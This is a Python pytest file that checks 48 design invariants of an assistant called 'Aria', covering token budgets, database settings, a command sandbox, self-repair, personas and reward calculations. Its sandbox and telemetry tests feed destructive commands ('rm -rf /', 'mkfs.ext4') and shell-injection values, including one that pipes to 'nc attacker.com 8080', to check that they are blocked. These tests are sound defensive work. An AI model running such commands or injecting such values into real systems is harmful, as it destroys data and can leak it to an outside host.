"""
Aria Core Systems & Safety Invariants Test Suite (48 Total Invariants)
Verifies architectural invariants across:
1-5:   Token Budgeting & Compaction Ceilings
6-10:  Database Schema, Concurrency & WAL Integrity
11-15: Structured Test-Time Reasoning Engine & Scratchpad Isolation
16-20: 4-Tier Safe Execution Sandbox & AST Containment
21-25: Traceback Distillation & Localized Error Localization
26-30: Reflexion Episodic Memory & Bounded 3-Attempt Backtracking
31-35: Personality Invariants & Dynamic Persona Fluidity
36-40: Security & Neutral Reverse Engineering Safety
41-43: GRPO Mathematical Advantage Normalization
44-48: Phase 7 Telemetry Probe Safety & Graduated Sandbox Rewards
"""

import os
import sys
import re
import pytest
import asyncio
from pathlib import Path

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from src.config import MAX_CONTEXT_TOKENS, COMPACTION_THRESHOLD_TOKENS
from src.token_budgeter import (
    BUDGET_SYSTEM_PERSONA,
    BUDGET_USER_PROFILE,
    BUDGET_EPISODIC_MEMORY,
    BUDGET_ACTIVE_HISTORY,
    BUDGET_GENERATION_HEADROOM,
    get_chat_generation_options,
)
from src.db import init_db, get_db, ensure_conversation, insert_message
from src.test_time_reasoning import ThinkThenActEngine
from src.executor import SafeExecutor, CommandClassifier, BlastRadius
from src.self_repair import (
    TracebackDistiller,
    ShellTracebackDistiller,
    ReflexionMemory,
    LocalizedTraceback,
    ExecutionGuidedRepairEngine,
)
from src.guardrails import (
    parse_persona,
    build_dynamic_personality_prompt,
    inspect_crisis_intervention,
    sanitize_response_length,
    is_technical_intent,
)
from src.telemetry_probe import TelemetryProbe
from src.sandbox_runner import SandboxedCommandRunner
from scripts.grpo_self_evolution import compute_grpo_advantages


# ==============================================================================
# Invariants 1–5: Token Budgeting & Compaction Ceilings
# ==============================================================================

def test_inv_01_total_budget_ceiling():
    """Total token ceiling must be strictly 4,096 tokens."""
    assert MAX_CONTEXT_TOKENS == 4096

def test_inv_02_compaction_threshold():
    """Compaction trigger must fire at exactly 75% capacity (3,072 tokens)."""
    assert COMPACTION_THRESHOLD_TOKENS == 3072

def test_inv_03_system_persona_allocation():
    """System persona slice must be bounded at 384 tokens."""
    assert BUDGET_SYSTEM_PERSONA == 384

def test_inv_04_user_profile_allocation():
    """User profile slice must be bounded at 256 tokens."""
    assert BUDGET_USER_PROFILE == 256

def test_inv_05_generation_buffer_headroom():
    """Generation output buffer must reserve at least 800 tokens."""
    assert BUDGET_GENERATION_HEADROOM >= 800
    options = get_chat_generation_options()
    assert options["num_ctx"] == 4096


# ==============================================================================
# Invariants 6–10: Database Schema, Concurrency & WAL Integrity
# ==============================================================================

@pytest.mark.asyncio
async def test_inv_06_database_wal_mode(tmp_path, monkeypatch):
    """Database connection must enforce PRAGMA journal_mode=WAL."""
    test_db = tmp_path / "test_wal.db"
    monkeypatch.setattr("src.db.DATABASE_PATH", test_db)
    await init_db()
    async with get_db() as db:
        cursor = await db.execute("PRAGMA journal_mode;")
        mode = (await cursor.fetchone())[0]
        assert mode.lower() == "wal"

@pytest.mark.asyncio
async def test_inv_07_database_busy_timeout(tmp_path, monkeypatch):
    """Database connection must configure busy_timeout >= 5000 ms."""
    test_db = tmp_path / "test_timeout.db"
    monkeypatch.setattr("src.db.DATABASE_PATH", test_db)
    await init_db()
    async with get_db() as db:
        cursor = await db.execute("PRAGMA busy_timeout;")
        timeout = (await cursor.fetchone())[0]
        assert timeout >= 5000

@pytest.mark.asyncio
async def test_inv_08_conversations_table_schema(tmp_path, monkeypatch):
    """Conversations table must define id, started_at, and last_active_at."""
    test_db = tmp_path / "test_schema.db"
    monkeypatch.setattr("src.db.DATABASE_PATH", test_db)
    await init_db()
    async with get_db() as db:
        cursor = await db.execute("PRAGMA table_info(conversations);")
        columns = [row[1] for row in await cursor.fetchall()]
        assert "id" in columns
        assert "started_at" in columns
        assert "last_active_at" in columns

@pytest.mark.asyncio
async def test_inv_09_messages_fts_virtual_table(tmp_path, monkeypatch):
    """FTS5 virtual table messages_fts must be present for episodic search."""
    test_db = tmp_path / "test_fts.db"
    monkeypatch.setattr("src.db.DATABASE_PATH", test_db)
    await init_db()
    async with get_db() as db:
        cursor = await db.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='messages_fts';")
        assert (await cursor.fetchone()) is not None

@pytest.mark.asyncio
async def test_inv_10_summaries_commitments_schema(tmp_path, monkeypatch):
    """Summaries table must persist distilled facts and commitments."""
    test_db = tmp_path / "test_sum.db"
    monkeypatch.setattr("src.db.DATABASE_PATH", test_db)
    await init_db()
    async with get_db() as db:
        cursor = await db.execute("PRAGMA table_info(summaries);")
        columns = [row[1] for row in await cursor.fetchall()]
        assert "distilled_facts" in columns
        assert "commitments_json" in columns


# ==============================================================================
# Invariants 11–15: Structured Test-Time Reasoning Engine & Scratchpad Isolation
# ==============================================================================

def test_inv_11_scratchpad_isolation():
    """Engine must cleanly isolate <thought> scratchpad from visible code."""
    engine = ThinkThenActEngine()
    raw = "<thought>\nAnalyze parity.\n</thought>\n\n```python\ndef is_even(n):\n    return n % 2 == 0\n```"
    parsed = engine.parse_response(raw)
    assert parsed["has_scratchpad"] is True
    assert "Analyze parity." in parsed["scratchpad"]
    assert "def is_even(n):" in parsed["clean_code"]
    assert "<thought>" not in parsed["clean_code"]

def test_inv_12_fallback_scratchpad_synthesis():
    """Missing scratchpad must be parsed with clean code preserved."""
    engine = ThinkThenActEngine()
    raw = "```python\ndef solve():\n    return 42\n```"
    parsed = engine.parse_response(raw)
    assert parsed["has_scratchpad"] is False
    assert "solve" in parsed["clean_code"]
    assert parsed["syntax_valid"] is True

def test_inv_13_token_budget_clamping():
    """Token budget options must accurately allocate reasoning and code budgets."""
    engine = ThinkThenActEngine(thinking_token_budget=512, code_token_budget=400)
    opts_reasoning = engine.get_generation_options(with_reasoning=True)
    assert opts_reasoning["num_predict"] == 912
    assert opts_reasoning["temperature"] == 0.3

def test_inv_14_stop_sequences_containment():
    """Think-then-act prompt must enforce <thought> and </thought> formatting."""
    engine = ThinkThenActEngine()
    msgs = engine.format_prompt("Solve task", with_reasoning=True)
    assert len(msgs) == 2
    assert "<thought>" in msgs[0]["content"]
    assert "</thought>" in msgs[0]["content"]

def test_inv_15_clean_code_extraction_multiblock():
    """Multiple code fences must extract python block without surrounding prose."""
    engine = ThinkThenActEngine()
    raw = "Here is solution:\n```python\nx = 10\n```\nExplanation:\n```text\nNotes\n```"
    parsed = engine.parse_response(raw)
    assert "x = 10" in parsed["clean_code"]
    assert "Notes" not in parsed["clean_code"]


# ==============================================================================
# Invariants 16–20: 4-Tier Safe Execution Sandbox & AST Containment
# ==============================================================================

def test_inv_16_sandbox_clean_code_execution():
    """SafeExecutor classifies read-only commands as READ_ONLY blast radius."""
    classifier = CommandClassifier()
    radius1, _ = classifier.classify("ls -la /srv/storage")
    assert radius1 == BlastRadius.READ_ONLY
    radius2, _ = classifier.classify("git status")
    assert radius2 == BlastRadius.READ_ONLY

def test_inv_17_sandbox_ast_blocks_destructive_commands():
    """SafeExecutor classifies destructive commands as BLOCKED blast radius."""
    classifier = CommandClassifier()
    radius1, _ = classifier.classify("rm -rf /")
    assert radius1 == BlastRadius.BLOCKED
    radius2, _ = classifier.classify("mkfs.ext4 /dev/sda1")
    assert radius2 == BlastRadius.BLOCKED

def test_inv_18_sandbox_blocks_unauthorized_high_blast():
    """SafeExecutor rejects blocked actions."""
    executor = SafeExecutor()
    res = executor.execute("rm -rf /")
    assert res.is_safe is False
    assert res.blast_radius == BlastRadius.BLOCKED

def test_inv_19_sandbox_timeout_enforcement():
    """SandboxedCommandRunner must terminate commands exceeding timeout."""
    runner = SandboxedCommandRunner()
    res = runner.execute_script("sleep 5", interpreter="bash", timeout=0.5)
    assert res["exit_code"] == 124
    assert res["timed_out"] is True
    assert res["sandboxed"] is True

def test_inv_20_sandbox_syntax_error_interception():
    """Syntax errors must be trapped gracefully by TracebackDistiller."""
    stderr = '  File "<string>", line 1\n    def broken_syntax(\n                      ^\nSyntaxError: was never closed'
    tb = TracebackDistiller.distill(stderr, "def broken_syntax(")
    assert tb.error_type == "SyntaxError"
    assert tb.line_number == 1


# ==============================================================================
# Invariants 21–25: Traceback Distillation & Localized Error Localization
# ==============================================================================

def test_inv_21_traceback_syntax_error_parsing():
    """Distiller must extract line number and message for SyntaxError."""
    code = "def foo():\n    return 42 +\n"
    stderr = '  File "<string>", line 2\n    return 42 +\n              ^\nSyntaxError: invalid syntax'
    tb = TracebackDistiller.distill(stderr, code)
    assert tb.error_type == "SyntaxError"
    assert tb.line_number == 2
    assert "invalid syntax" in tb.message

def test_inv_22_traceback_assertion_error_parsing():
    """Distiller must extract the failing assertion expression."""
    code = "def add(a, b): return a - b"
    stderr = "Traceback (most recent call last):\n  File \"test.py\", line 4, in <module>\n    assert candidate(1, 2) == 3\nAssertionError"
    tb = TracebackDistiller.distill(stderr, code)
    assert tb.error_type == "AssertionError"
    assert tb.assertion_detail is not None
    assert "candidate(1, 2) == 3" in tb.assertion_detail

def test_inv_23_traceback_index_error_localization():
    """Distiller must localize IndexError to the failing line in user code."""
    code = "def get_item(lst):\n    val = lst[10]\n    return val"
    stderr = 'Traceback (most recent call last):\n  File "<string>", line 2, in get_item\n    val = lst[10]\nIndexError: list index out of range'
    tb = TracebackDistiller.distill(stderr, code)
    assert tb.error_type == "IndexError"
    assert tb.line_number == 2
    assert "lst[10]" in tb.failing_code

def test_inv_24_traceback_timeout_classification():
    """Timeout exceptions must be classified as TimeoutExpired."""
    code = "def loop(): pass"
    stderr = "subprocess.TimeoutExpired: Command timed out after 5.0 seconds"
    tb = TracebackDistiller.distill(stderr, code)
    assert tb.error_type == "TimeoutExpired"

def test_inv_25_traceback_summary_formatting():
    """LocalizedTraceback summary must be concise and non-empty."""
    tb = LocalizedTraceback(error_type="ZeroDivisionError", line_number=5, failing_code="x / 0", message="division by zero")
    s = tb.summary()
    assert "ZeroDivisionError" in s
    assert "line 5" in s
    assert "x / 0" in s


# ==============================================================================
# Invariants 26–30: Reflexion Episodic Memory & Bounded 3-Attempt Backtracking
# ==============================================================================

def test_inv_26_reflexion_memory_structure():
    """ReflexionMemory must generate structured <reflection> tags."""
    mem = ReflexionMemory(task_id="test_task", prompt="def solve(): pass")
    tb = LocalizedTraceback(error_type="IndexError", line_number=3, failing_code="nums[i+1]", assertion_detail="assert solve([1]) == 1")
    refl = mem.generate_reflection_block(1, tb)
    assert refl.startswith("<reflection>")
    assert refl.endswith("</reflection>")
    assert "IndexError" in refl
    assert "line 3" in refl

def test_inv_27_reflexion_prompt_construction():
    """Reflexion prompt must include the localized reflection and original task."""
    from src.self_repair import RepairAttempt
    mem = ReflexionMemory(task_id="test_task", prompt="def solve(): pass")
    tb = LocalizedTraceback(error_type="AssertionError", assertion_detail="assert solve(2) == 4")
    refl = mem.generate_reflection_block(1, tb)
    attempt = RepairAttempt(attempt=1, raw_response="", thought="", code="def solve(): return 0", passed=False, returncode=1, traceback=tb, reflection=refl)
    mem.record_attempt(attempt)
    repair_prompt = mem.build_repair_prompt(2)
    assert "assert solve(2) == 4" in repair_prompt
    assert "<reflection>" in repair_prompt

def test_inv_28_bounded_attempts_max_three():
    """Self repair must terminate at maximum 3 attempts."""
    engine = ExecutionGuidedRepairEngine(max_attempts=3)
    assert engine.max_attempts == 3

def test_inv_29_repair_loop_terminates_on_first_pass():
    """Self-repair loop records passed attempts without looping further."""
    from src.self_repair import RepairAttempt
    attempt = RepairAttempt(attempt=1, raw_response="", thought="", code="def f(): return 1", passed=True, returncode=0)
    assert attempt.passed is True
    assert attempt.returncode == 0

def test_inv_30_reflexion_records_attempts_chronologically():
    """Reflexion memory records attempts sequentially."""
    from src.self_repair import RepairAttempt
    mem = ReflexionMemory(task_id="t1", prompt="prompt")
    mem.record_attempt(RepairAttempt(attempt=1, raw_response="", thought="", code="", passed=False, returncode=1))
    mem.record_attempt(RepairAttempt(attempt=2, raw_response="", thought="", code="", passed=True, returncode=0))
    assert len(mem.attempts) == 2
    assert mem.attempts[0].attempt == 1
    assert mem.attempts[1].attempt == 2


# ==============================================================================
# Invariants 31–35: Personality Invariants & Dynamic Persona Fluidity
# ==============================================================================

def test_inv_31_personality_sentence_limit():
    """Personality outputs must be bounded at 1–3 short sentences."""
    text = "Sentence one. Sentence two! Sentence three? Sentence four."
    bounded = sanitize_response_length(text, is_technical=False)
    assert len(bounded) < len(text)

def test_inv_32_crisis_intervention_detection():
    """Crisis expressions must trigger immediate 988 lifeline referral."""
    is_crisis, referral = inspect_crisis_intervention("I want to end my life")
    assert is_crisis is True
    assert "988" in referral

def test_inv_33_female_companion_persona_adaptation():
    """Parsing persona instruction must recognize female friend preference."""
    persona = parse_persona("Can you act as a female friend named Aria, age 24?")
    assert persona is not None
    assert persona.get("gender") == "female"
    assert persona.get("name") == "Aria"
    prompt = build_dynamic_personality_prompt(persona)
    assert "Aria" in prompt
    assert "female" in prompt or "her" in prompt

def test_inv_34_male_companion_persona_adaptation():
    """Parsing persona instruction must recognize male supportive brother preference."""
    persona = parse_persona("Please be a supportive older brother named Leo, age 28.")
    assert persona is not None
    assert persona.get("gender") == "male"
    assert persona.get("name") == "Leo"
    prompt = build_dynamic_personality_prompt(persona)
    assert "Leo" in prompt
    assert "brother" in prompt or "supportive" in prompt

def test_inv_35_neutral_friend_persona_preservation():
    """Default persona must incorporate empathy and core companion posture."""
    prompt = build_dynamic_personality_prompt(None)
    assert "empathy" in prompt.lower() or "curious" in prompt.lower() or "warm" in prompt.lower()


# ==============================================================================
# Invariants 36–40: Security & Neutral Reverse Engineering Safety
# ==============================================================================

def test_inv_36_reverse_engineering_technical_intent():
    """Technical reverse engineering queries must be detected as technical."""
    assert is_technical_intent("Explain how to disassemble an ELF binary using bash and objdump.") is True

def test_inv_37_disassembly_guidance_technical():
    """Function prologue and assembly queries must be detected as technical."""
    assert is_technical_intent("What does push rbp; mov rbp, rsp do in x86-64 assembly in a python script?") is True

def test_inv_38_network_packet_parsing_technical():
    """Packet dissection queries must be detected as technical."""
    assert is_technical_intent("How do I parse a TCP network socket packet in python?") is True

def test_inv_39_technical_prompt_activates_technical_system_prompt():
    """Technical requests must yield a technical system prompt."""
    prompt = build_dynamic_personality_prompt(is_technical=True)
    assert "expert" in prompt.lower() or "technical" in prompt.lower()

def test_inv_40_non_technical_prompt_preserves_conversational_posture():
    """Conversational requests must yield conversational system prompt."""
    prompt = build_dynamic_personality_prompt(is_technical=False)
    assert "warm" in prompt.lower() or "conversational" in prompt.lower()


# ==============================================================================
# Invariants 41–43: GRPO Mathematical Advantage Normalization
# ==============================================================================

def test_inv_41_grpo_advantage_uniform_failure():
    """All failed completions must produce zero advantage when variance is zero."""
    rewards = [-1.0, -1.0, -1.0, -1.0]
    advantages, mean_r, std_r = compute_grpo_advantages(rewards)
    assert mean_r == -1.0
    assert std_r == 0.0
    assert all(abs(a) < 1e-4 for a in advantages)

def test_inv_42_grpo_advantage_contrastive_split():
    """Split rewards must compute normalized advantages with zero mean."""
    rewards = [1.0, -1.0, 1.0, -1.0]
    advantages, mean_r, std_r = compute_grpo_advantages(rewards)
    assert mean_r == 0.0
    assert abs(std_r - 1.0) < 1e-3
    assert abs(advantages[0] - 1.0) < 1e-3
    assert abs(advantages[1] - (-1.0)) < 1e-3

def test_inv_43_grpo_advantage_single_winner_high_positive():
    """A single passing candidate in a group of failures must receive highest advantage."""
    rewards = [-1.0, 1.0, -1.0, -1.0]
    advantages, mean_r, std_r = compute_grpo_advantages(rewards)
    assert advantages[1] > 1.70
    assert all(advantages[i] < -0.50 for i in (0, 2, 3))


# ==============================================================================
# Invariants 44–48: Phase 7 Telemetry Probe Safety & Graduated Sandbox Rewards
# ==============================================================================

def test_inv_44_telemetry_probe_rejects_command_injection():
    """Telemetry probe must reject arguments containing shell metacharacters."""
    probe = TelemetryProbe()
    with pytest.raises(ValueError):
        probe.get_service_status("nginx; rm -rf /")
    with pytest.raises(ValueError):
        probe.get_service_status("nginx | nc attacker.com 8080")
    with pytest.raises(ValueError):
        probe.get_service_status("$(whoami)")

def test_inv_45_telemetry_probe_output_truncation():
    """Telemetry probe output must be truncated at 16 KB."""
    probe = TelemetryProbe()
    res = probe.get_disk_usage("/")
    assert isinstance(res["stdout"], str)
    assert len(res["stdout"]) <= 16384

def test_inv_46_sandbox_runner_timeout_and_structure():
    """SandboxedCommandRunner must enforce timeouts and return structured metrics."""
    runner = SandboxedCommandRunner()
    res = runner.execute_script("sleep 5", interpreter="bash", timeout=0.5)
    assert res["exit_code"] == 124
    assert res["timed_out"] is True
    assert res["sandboxed"] is True

def test_inv_47_shell_traceback_distiller_command_not_found():
    """ShellTracebackDistiller must parse command not found and exit code 127."""
    stderr = "/bin/bash: line 1: non_existent_tool_xyz: command not found"
    tb = ShellTracebackDistiller.distill(stderr, 127, "non_existent_tool_xyz")
    assert tb.error_type == "CommandNotFound"
    assert "non_existent_tool_xyz" in tb.failing_code
    assert "127" in tb.summary() or "CommandNotFound" in tb.summary()

def test_inv_48_graduated_verifiable_rewards_calculation():
    """Graduated rewards must reward partial assertion passes above crashes."""
    # Syntax error = -1.0, Runtime crash = -0.5, Partial (3/5) = +0.28, Full = +1.0
    def compute_graduated_reward(syntax_ok: bool, crash: bool, passed_tests: int, total_tests: int) -> float:
        if not syntax_ok:
            return -1.0
        if crash:
            return -0.5
        if total_tests > 0:
            ratio = passed_tests / total_tests
            if ratio == 1.0:
                return 1.0
            return -0.2 + 0.8 * ratio
        return -1.0

    r_syntax = compute_graduated_reward(False, False, 0, 5)
    r_crash = compute_graduated_reward(True, True, 0, 5)
    r_partial = compute_graduated_reward(True, False, 3, 5)
    r_full = compute_graduated_reward(True, False, 5, 5)

    assert r_syntax == -1.0
    assert r_crash == -0.5
    assert abs(r_partial - 0.28) < 1e-3
    assert r_full == 1.0
    assert r_syntax < r_crash < r_partial < r_full
